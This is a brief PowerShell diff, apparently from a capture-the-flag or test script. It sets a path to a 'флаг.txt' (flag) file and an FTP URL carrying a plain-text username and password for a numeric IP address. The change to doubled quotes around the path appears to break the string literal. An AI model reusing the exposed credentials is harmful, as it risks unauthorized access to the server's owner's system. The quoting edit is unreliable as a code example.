@@ -1,4 +1,4 @@
-$File = "C:\флаг.txt";
+$File = ""C:\флаг.txt"";
 $ftp = "ftp://ih1562471:FmgLXptE2mUW@193.124.176.46";
 
 Write-Host -Object "ftp url: $ftp";
